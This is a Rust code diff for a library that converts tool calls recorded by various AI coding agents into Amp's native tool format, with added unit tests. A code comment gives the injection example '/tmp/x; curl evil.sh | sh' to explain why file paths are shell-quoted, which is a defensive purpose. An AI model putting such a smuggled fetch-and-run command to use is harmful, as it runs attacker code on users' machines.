@@ -34,9 +34,7 @@ use crate::types::{
     ToolResultBlock, ToolUseBlock, strip_file_scheme,
 };
 use serde_json::{Map, Value, json};
-use toolpath_convo::{
-    ConversationProjector, ConversationView, Result, Role, ToolInvocation, Turn,
-};
+use toolpath_convo::{ConversationProjector, ConversationView, Result, Role, ToolInvocation, Turn};
 
 /// Build the single user message that rehydrates a prior session into a
 /// fresh Amp thread.
@@ -418,36 +416,196 @@ fn diff_counts(diff: Option<&str>) -> (u64, u64) {
     (adds, dels)
 }
 
-/// Remap a foreign tool into Amp's native vocabulary; Amp-native names pass
-/// through verbatim, and unclassifiable foreign names are left alone rather
-/// than guessed.
+/// Keys foreign write-shaped tools use for the target path (claude
+/// `file_path`, opencode `filePath`, copilot/pi `path`, cursor
+/// `targetFile`/`relativeWorkspacePath`, claude NotebookEdit
+/// `notebook_path`, gemini `absolute_path`).
+const WRITE_PATH_KEYS: [&str; 9] = [
+    "file_path",
+    "filePath",
+    "path",
+    "targetFile",
+    "target_file",
+    "relativeWorkspacePath",
+    "notebook_path",
+    "absolute_path",
+    "file",
+];
+
+/// Keys carrying full file content on write/create-shaped tools.
+const CONTENT_KEYS: [&str; 5] = ["content", "file_text", "fileText", "new_source", "contents"];
+
+/// Old/new string-pair spellings across harnesses (claude, opencode,
+/// copilot, cursor camelCase, pi's `edits[]` entries).
+const OLD_NEW_KEYS: [(&str, &str); 6] = [
+    ("old_string", "new_string"),
+    ("oldString", "newString"),
+    ("old_str", "new_str"),
+    ("oldStr", "newStr"),
+    ("old_text", "new_text"),
+    ("oldText", "newText"),
+];
+
+/// Keys that can serve as `finder.query` — `query` first (already
+/// natural-language), then the pattern spellings (Grep/Glob/gemini
+/// `pattern`, cursor `globPattern`).
+const SEARCH_QUERY_KEYS: [&str; 5] = [
+    "query",
+    "pattern",
+    "globPattern",
+    "glob_pattern",
+    "filePattern",
+];
+
+fn str_of<'a>(input: &'a Value, keys: &[&str]) -> Option<&'a str> {
+    keys.iter()
+        .find_map(|k| input.get(*k).and_then(Value::as_str))
+}
+
+fn old_new_of(v: &Value) -> Option<(&str, &str)> {
+    OLD_NEW_KEYS.iter().find_map(|(o, n)| {
+        match (
+            v.get(*o).and_then(Value::as_str),
+            v.get(*n).and_then(Value::as_str),
+        ) {
+            (Some(a), Some(b)) => Some((a, b)),
+            _ => None,
+        }
+    })
+}
+
+fn push_hunk(out: &mut String, old: &str, new: &str) {
+    out.push_str("@@\n");
+    for l in old.lines() {
+        out.push('-');
+        out.push_str(l);
+        out.push('\n');
+    }
+    for l in new.lines() {
+        out.push('+');
+        out.push_str(l);
+        out.push('\n');
+    }
+}
+
+/// Synthesize an `apply_patch` `patchText` envelope (the `*** Begin
+/// Patch` format amp's UI parses for file chips and diffstats) from a
+/// foreign write-shaped input. `None` when the args carry neither content
+/// nor old/new strings — fabricating an empty patch would misrepresent
+/// what the tool did.
+fn patch_text_for(input: &Value) -> Option<String> {
+    let path = str_of(input, &WRITE_PATH_KEYS)?;
+    if let Some(content) = str_of(input, &CONTENT_KEYS) {
+        let mut out = format!("*** Begin Patch\n*** Add File: {path}\n");
+        for l in content.lines() {
+            out.push('+');
+            out.push_str(l);
+            out.push('\n');
+        }
+        out.push_str("*** End Patch");
+        return Some(out);
+    }
+    let mut hunks = String::new();
+    if let Some((old, new)) = old_new_of(input) {
+        push_hunk(&mut hunks, old, new);
+    } else if let Some(edits) = input.get("edits").and_then(Value::as_array) {
+        for e in edits {
+            if let Some((old, new)) = old_new_of(e) {
+                push_hunk(&mut hunks, old, new);
+            }
+        }
+    }
+    if hunks.is_empty() {
+        return None;
+    }
+    Some(format!(
+        "*** Begin Patch\n*** Update File: {path}\n{hunks}*** End Patch"
+    ))
+}
+
+/// Reshape a foreign shell input so the command sits under `command` (the
+/// key amp's UI reads; codex `exec_command` uses `cmd`). `workdir` is
+/// kept — amp's own `shell_command` takes it; executor tuning knobs are
+/// dropped, they mean nothing to amp.
+fn shell_input(input: &Value) -> Value {
+    match input {
+        Value::String(cmd) => json!({ "command": cmd }),
+        v if v.get("command").is_some() => v.clone(),
+        v => match v.get("cmd").and_then(Value::as_str) {
+            Some(cmd) => {
+                let mut m = Map::new();
+                m.insert("command".into(), Value::String(cmd.to_string()));
+                if let Some(wd) = v.get("workdir").and_then(Value::as_str) {
+                    m.insert("workdir".into(), Value::String(wd.to_string()));
+                }
+                Value::Object(m)
+            }
+            None => v.clone(),
+        },
+    }
+}
+
+/// Remap a foreign tool into Amp's native vocabulary with args reshaped to
+/// the keys amp's UI actually reads (`docs/agents/formats/amp/events.md`,
+/// "Native tool vocabulary"). Amp-native names pass through verbatim;
+/// unclassifiable foreign names — and classifiable ones whose args can't
+/// be reshaped honestly — are left alone rather than guessed: amp's
+/// generic tool row renders an unknown name fine, while a native name
+/// wrapping unreadable args renders as an empty shell.
 fn projected_tool(tu: &ToolInvocation) -> (String, Value) {
+    // Codex writes its (identically named) apply_patch with a free-form
+    // string input; amp reads `input.patchText`. Normalize before the
+    // native passthrough.
+    if tu.name == "apply_patch"
+        && let Value::String(pt) = &tu.input
+    {
+        return ("apply_patch".to_string(), json!({ "patchText": pt }));
+    }
     if NATIVE_TOOLS.contains(&tu.name.as_str()) {
         return (tu.name.clone(), tu.input.clone());
     }
+    let passthrough = || (tu.name.clone(), tu.input.clone());
     let Some(category) = tu.category.or_else(|| tool_category(&tu.name)) else {
-        return (tu.name.clone(), tu.input.clone());
+        return passthrough();
     };
+    use toolpath_convo::ToolCategory as C;
     let native = native_name(category, &tu.input);
-    let input = match (category, native) {
+    match category {
         // Amp has no read tool; the native equivalent is a shell `cat`.
-        (toolpath_convo::ToolCategory::FileRead, "shell_command") => {
-            match read_target(&tu.input) {
-                // Quoted: the path is data from the source document, and
-                // this string is both a plausible shell command and part of
-                // the transcript a live agent reads back. An unquoted
-                // `/tmp/x; curl evil.sh | sh` would render as a command the
-                // prior session appeared to run.
-                Some(path) => json!({ "command": format!("cat {}", shell_quote(&path)) }),
-                None => tu.input.clone(),
+        C::FileRead => match read_target(&tu.input) {
+            // Quoted: the path is data from the source document, and
+            // this string is both a plausible shell command and part of
+            // the transcript a live agent reads back. An unquoted
+            // `/tmp/x; curl evil.sh | sh` would render as a command the
+            // prior session appeared to run.
+            Some(path) => (
+                native.to_string(),
+                json!({ "command": format!("cat {}", shell_quote(&path)) }),
+            ),
+            None => passthrough(),
+        },
+        C::Shell => (native.to_string(), shell_input(&tu.input)),
+        C::FileWrite => match patch_text_for(&tu.input) {
+            Some(pt) => (native.to_string(), json!({ "patchText": pt })),
+            None => passthrough(),
+        },
+        C::FileSearch => match str_of(&tu.input, &SEARCH_QUERY_KEYS) {
+            Some(q) => (native.to_string(), json!({ "query": q })),
+            None => passthrough(),
+        },
+        C::Network => {
+            // `native_name` picked web_search iff `query` is present;
+            // read_web_page needs a `url` to render.
+            if native == "web_search" {
+                let q = tu.input.get("query").and_then(Value::as_str).unwrap_or("");
+                (native.to_string(), json!({ "query": q }))
+            } else if let Some(url) = tu.input.get("url").and_then(Value::as_str) {
+                (native.to_string(), json!({ "url": url }))
+            } else {
+                passthrough()
             }
         }
-        (toolpath_convo::ToolCategory::Shell, "shell_command") => match &tu.input {
-            Value::String(cmd) => json!({ "command": cmd }),
-            v if v.get("command").is_some() => v.clone(),
-            v => v.clone(),
-        },
-        (toolpath_convo::ToolCategory::Delegation, "Task") => {
+        C::Delegation => {
             let prompt = tu
                 .input
                 .get("prompt")
@@ -457,13 +615,16 @@ fn projected_tool(tu: &ToolInvocation) -> (String, Value) {
             let description = tu
                 .input
                 .get("description")
+                .or_else(|| tu.input.get("agent_name"))
+                .or_else(|| tu.input.get("name"))
                 .and_then(Value::as_str)
                 .unwrap_or("delegated task");
-            json!({ "prompt": prompt, "description": description })
+            (
+                native.to_string(),
+                json!({ "prompt": prompt, "description": description }),
+            )
         }
-        _ => tu.input.clone(),
-    };
-    (native.to_string(), input)
+    }
 }
 
 /// POSIX single-quote a string so it survives a shell as one literal word.
@@ -472,7 +633,15 @@ fn shell_quote(s: &str) -> String {
 }
 
 fn read_target(input: &Value) -> Option<String> {
-    for key in ["file_path", "path", "target_file", "absolute_path", "file"] {
+    for key in [
+        "file_path",
+        "filePath",
+        "path",
+        "targetFile",
+        "target_file",
+        "absolute_path",
+        "file",
+    ] {
         if let Some(p) = input.get(key).and_then(Value::as_str) {
             return Some(p.to_string());
         }
@@ -556,7 +725,10 @@ mod tests {
             assert_eq!(a.stop_reason, b.stop_reason);
             assert_eq!(a.token_usage, b.token_usage, "usage survives re-expansion");
             assert_eq!(a.model, b.model, "model survives the round trip");
-            assert_eq!(a.timestamp, b.timestamp, "timestamp survives the round trip");
+            assert_eq!(
+                a.timestamp, b.timestamp,
+                "timestamp survives the round trip"
+            );
             // File mutations are the crate's headline fidelity claim —
             // compare the diffs themselves, not just the touched paths.
             assert_eq!(a.file_mutations.len(), b.file_mutations.len());
@@ -705,8 +877,11 @@ mod tests {
     #[test]
     fn token_reexpansion_regenerates_derived_total_only() {
         let export = reproject(&real_view());
-        let with_usage: Vec<&MessageUsage> =
-            export.messages.iter().filter_map(|m| m.usage.as_ref()).collect();
+        let with_usage: Vec<&MessageUsage> = export
+            .messages
+            .iter()
+            .filter_map(|m| m.usage.as_ref())
+            .collect();
         assert_eq!(with_usage.len(), 12, "one usage per assistant message");
         for u in &with_usage {
             // The verified invariant, regenerated on the way out.
@@ -853,9 +1028,7 @@ mod tests {
             .iter()
             .flat_map(|m| &m.content)
             .find_map(|b| match b {
-                Block::Known(KnownBlock::ToolUse(tu)) => {
-                    Some((tu.name.clone(), tu.input.clone()))
-                }
+                Block::Known(KnownBlock::ToolUse(tu)) => Some((tu.name.clone(), tu.input.clone())),
                 _ => None,
             })
             .unwrap()
@@ -929,6 +1102,316 @@ mod tests {
         assert_eq!(name, "hologram");
     }
 
+    /// Full-content foreign writes (claude Write, copilot create, gemini
+    /// write_file, opencode/pi write) synthesize the `*** Add File`
+    /// envelope amp's UI parses out of `input.patchText`.
+    #[test]
+    fn foreign_writes_synthesize_add_file_patch_text() {
+        let cases = [
+            (
+                "Write",
+                json!({"file_path": "/tmp/a.md", "content": "line one\nline two"}),
+                "*** Begin Patch\n*** Add File: /tmp/a.md\n+line one\n+line two\n*** End Patch",
+            ),
+            (
+                "create",
+                json!({"path": "/tmp/c.sh", "file_text": "echo 1\n"}),
+                "*** Begin Patch\n*** Add File: /tmp/c.sh\n+echo 1\n*** End Patch",
+            ),
+            (
+                "write_file",
+                json!({"file_path": "notes.md", "content": "x"}),
+                "*** Begin Patch\n*** Add File: notes.md\n+x\n*** End Patch",
+            ),
+            (
+                "write",
+                json!({"filePath": "n.md", "content": "x"}),
+                "*** Begin Patch\n*** Add File: n.md\n+x\n*** End Patch",
+            ),
+        ];
+        for (tool, input, expect) in cases {
+            let (name, out) = first_tool(&project_single(foreign_turn(
+                tool,
+                input,
+                Some(ToolCategory::FileWrite),
+            )));
+            assert_eq!(name, "apply_patch", "{tool}");
+            assert_eq!(out["patchText"], expect, "{tool}");
+        }
+    }
+
+    /// String-replace foreign edits (claude Edit, copilot edit, opencode
+    /// edit, gemini replace) synthesize an `*** Update File` hunk.
+    #[test]
+    fn foreign_edits_synthesize_update_patch_text() {
+        let cases = [
+            (
+                "Edit",
+                json!({"file_path": "/tmp/n.md", "old_string": "a\nb", "new_string": "c"}),
+                "*** Begin Patch\n*** Update File: /tmp/n.md\n@@\n-a\n-b\n+c\n*** End Patch",
+            ),
+            (
+                "edit",
+                json!({"path": "n.md", "old_str": "scratch", "new_str": "fixture"}),
+                "*** Begin Patch\n*** Update File: n.md\n@@\n-scratch\n+fixture\n*** End Patch",
+            ),
+            (
+                "edit",
+                json!({"filePath": "n.md", "oldString": "s", "newString": "f"}),
+                "*** Begin Patch\n*** Update File: n.md\n@@\n-s\n+f\n*** End Patch",
+            ),
+            (
+                "replace",
+                json!({"file_path": "n.md", "old_string": "s", "new_string": "f",
+                       "instruction": "change it"}),
+                "*** Begin Patch\n*** Update File: n.md\n@@\n-s\n+f\n*** End Patch",
+            ),
+        ];
+        for (tool, input, expect) in cases {
+            let (name, out) = first_tool(&project_single(foreign_turn(
+                tool,
+                input,
+                Some(ToolCategory::FileWrite),
+            )));
+            assert_eq!(name, "apply_patch", "{tool}");
+            assert_eq!(out["patchText"], expect, "{tool}");
+        }
+    }
+
+    /// Batch edits (claude MultiEdit `edits[{old_string,new_string}]`, pi
+    /// edit `edits[{oldText,newText}]`) become one hunk per entry.
+    #[test]
+    fn foreign_edits_arrays_synthesize_multi_hunk_patch_text() {
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "MultiEdit",
+            json!({"file_path": "m.md", "edits": [
+                {"old_string": "a", "new_string": "b"},
+                {"old_string": "c", "new_string": "d"},
+            ]}),
+            Some(ToolCategory::FileWrite),
+        )));
+        assert_eq!(name, "apply_patch");
+        assert_eq!(
+            out["patchText"],
+            "*** Begin Patch\n*** Update File: m.md\n@@\n-a\n+b\n@@\n-c\n+d\n*** End Patch"
+        );
+
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "edit",
+            json!({"path": "notes.md", "edits": [
+                {"oldText": "scratch", "newText": "fixture"},
+            ]}),
+            Some(ToolCategory::FileWrite),
+        )));
+        assert_eq!(name, "apply_patch");
+        assert_eq!(
+            out["patchText"],
+            "*** Begin Patch\n*** Update File: notes.md\n@@\n-scratch\n+fixture\n*** End Patch"
+        );
+    }
+
+    /// Codex writes `apply_patch` with a free-form string input; amp's UI
+    /// reads `input.patchText`, so the string is normalized into the
+    /// object shape even though the name is already native.
+    #[test]
+    fn native_apply_patch_string_input_normalized_to_patch_text() {
+        let body = "*** Begin Patch\n*** Add File: hello.rs\n+fn main(){}\n*** End Patch";
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "apply_patch",
+            Value::String(body.to_string()),
+            Some(ToolCategory::FileWrite),
+        )));
+        assert_eq!(name, "apply_patch");
+        assert_eq!(out["patchText"], body);
+    }
+
+    /// A FileWrite whose args carry neither content nor old/new strings
+    /// (claude TodoWrite, cursor edit_file_v2 — its content lives in
+    /// blobs, not args) cannot be rendered as a patch honestly; the name
+    /// passes through unguessed rather than fabricating an empty patch.
+    #[test]
+    fn unsynthesizable_file_writes_pass_through_unguessed() {
+        let (name, input) = first_tool(&project_single(foreign_turn(
+            "TodoWrite",
+            json!({"todos": [{"content": 1}]}),
+            Some(ToolCategory::FileWrite),
+        )));
+        assert_eq!(name, "TodoWrite");
+        assert!(input.get("todos").is_some());
+
+        let (name, _) = first_tool(&project_single(foreign_turn(
+            "edit_file_v2",
+            json!({"relativeWorkspacePath": "/w/n.md", "noCodeblock": true}),
+            Some(ToolCategory::FileWrite),
+        )));
+        assert_eq!(name, "edit_file_v2");
+    }
+
+    /// `finder` keys off `input.query` ("Searching codebase" + detail); a
+    /// pattern-shaped foreign search (Grep/Glob/cursor glob_file_search)
+    /// remaps its pattern into that key.
+    #[test]
+    fn foreign_search_remaps_to_finder_query() {
+        let cases = [
+            (
+                "Grep",
+                json!({"pattern": "fixture", "path": "/x"}),
+                "fixture",
+            ),
+            ("Glob", json!({"pattern": "note*"}), "note*"),
+            (
+                "glob_file_search",
+                json!({"targetDirectory": "/w", "globPattern": "note*"}),
+                "note*",
+            ),
+            (
+                "codebase_search",
+                json!({"query": "where is auth handled"}),
+                "where is auth handled",
+            ),
+        ];
+        for (tool, input, expect) in cases {
+            let (name, out) = first_tool(&project_single(foreign_turn(
+                tool,
+                input,
+                Some(ToolCategory::FileSearch),
+            )));
+            assert_eq!(name, "finder", "{tool}");
+            assert_eq!(out, json!({"query": expect}), "{tool}");
+        }
+    }
+
+    /// A FileSearch without any pattern/query key (gemini list_directory)
+    /// has nothing to put in `finder.query` — passthrough, not a guess.
+    #[test]
+    fn file_search_without_pattern_passes_through() {
+        let (name, input) = first_tool(&project_single(foreign_turn(
+            "list_directory",
+            json!({"dir_path": "."}),
+            Some(ToolCategory::FileSearch),
+        )));
+        assert_eq!(name, "list_directory");
+        assert_eq!(input["dir_path"], ".");
+    }
+
+    /// `web_search` keys off `query`, `read_web_page` off `url`; foreign
+    /// network tools reshape into exactly those keys.
+    #[test]
+    fn foreign_network_remaps_to_native_args() {
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "WebFetch",
+            json!({"url": "https://e.x/p", "prompt": "summarize"}),
+            Some(ToolCategory::Network),
+        )));
+        assert_eq!(name, "read_web_page");
+        assert_eq!(out, json!({"url": "https://e.x/p"}));
+
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "WebSearch",
+            json!({"query": "rust serde"}),
+            Some(ToolCategory::Network),
+        )));
+        assert_eq!(name, "web_search");
+        assert_eq!(out, json!({"query": "rust serde"}));
+
+        let (name, _) = first_tool(&project_single(foreign_turn(
+            "fetch_thing",
+            json!({"other": 1}),
+            Some(ToolCategory::Network),
+        )));
+        assert_eq!(name, "fetch_thing", "neither query nor url — no guess");
+    }
+
+    /// Codex `exec_command` carries the command under `cmd`; amp's UI
+    /// reads `command` (and `workdir` scopes it). Executor tuning knobs
+    /// don't survive — they mean nothing to amp.
+    #[test]
+    fn codex_shell_cmd_key_remapped() {
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "exec_command",
+            json!({"cmd": "wc -w notes.md", "workdir": "/w", "yield_time_ms": 1000}),
+            Some(ToolCategory::Shell),
+        )));
+        assert_eq!(name, "shell_command");
+        assert_eq!(out, json!({"command": "wc -w notes.md", "workdir": "/w"}));
+    }
+
+    /// Gemini `invoke_agent` names its agent but has no description; the
+    /// agent name is the honest stand-in.
+    #[test]
+    fn delegation_description_falls_back_to_agent_name() {
+        let (name, out) = first_tool(&project_single(foreign_turn(
+            "invoke_agent",
+            json!({"prompt": "count the words", "agent_name": "generalist"}),
+            Some(ToolCategory::Delegation),
+        )));
+        assert_eq!(name, "Task");
+        assert_eq!(out["prompt"], "count the words");
+        assert_eq!(out["description"], "generalist");
+    }
+
+    /// Once remapped, a second projection through amp's own forward path
+    /// is a fixed point — the matrix's cell shape, asserted at the wire
+    /// level over every remap family at once.
+    #[test]
+    fn foreign_remap_is_idempotent_through_forward() {
+        let specs: [(&str, Value, Option<ToolCategory>); 6] = [
+            (
+                "Write",
+                json!({"file_path": "/tmp/a.md", "content": "x\ny"}),
+                Some(ToolCategory::FileWrite),
+            ),
+            (
+                "Grep",
+                json!({"pattern": "fixture"}),
+                Some(ToolCategory::FileSearch),
+            ),
+            (
+                "WebFetch",
+                json!({"url": "https://e.x"}),
+                Some(ToolCategory::Network),
+            ),
+            (
+                "exec_command",
+                json!({"cmd": "ls", "workdir": "/w"}),
+                Some(ToolCategory::Shell),
+            ),
+            (
+                "Read",
+                json!({"file_path": "/tmp/x.rs"}),
+                Some(ToolCategory::FileRead),
+            ),
+            (
+                "TodoWrite",
+                json!({"todos": []}),
+                Some(ToolCategory::FileWrite),
+            ),
+        ];
+        let turns: Vec<Turn> = specs
+            .into_iter()
+            .enumerate()
+            .map(|(i, (tool, input, cat))| {
+                let mut t = foreign_turn(tool, input, cat);
+                t.id = format!("t{}", i + 1);
+                t.tool_uses[0].id = format!("call-{}", i + 1);
+                t
+            })
+            .collect();
+        let view = ConversationView {
+            id: "T-idem".into(),
+            turns,
+            ..Default::default()
+        };
+        let export1 = reproject(&view);
+        let back = to_view(&Session::from_export(export1.clone()));
+        let export2 = reproject(&back);
+        assert_eq!(
+            serde_json::to_value(&export1).unwrap(),
+            serde_json::to_value(&export2).unwrap(),
+            "remapped projection must be a fixed point"
+        );
+    }
+
     #[test]
     fn native_name_reclassification_invariant() {
         // Every projected native name must classify back to the category it
@@ -938,7 +1421,11 @@ mod tests {
             (ToolCategory::Shell, json!({}), ToolCategory::Shell),
             (ToolCategory::FileRead, json!({}), ToolCategory::Shell),
             (ToolCategory::FileWrite, json!({}), ToolCategory::FileWrite),
-            (ToolCategory::FileSearch, json!({}), ToolCategory::FileSearch),
+            (
+                ToolCategory::FileSearch,
+                json!({}),
+                ToolCategory::FileSearch,
+            ),
             (
                 ToolCategory::Network,
                 json!({"query": "x"}),
@@ -949,7 +1436,11 @@ mod tests {
                 json!({"url": "x"}),
                 ToolCategory::Network,
             ),
-            (ToolCategory::Delegation, json!({}), ToolCategory::Delegation),
+            (
+                ToolCategory::Delegation,
+                json!({}),
+                ToolCategory::Delegation,
+            ),
         ];
         for (cat, input, expect) in cases {
             let native = native_name(cat, &input);
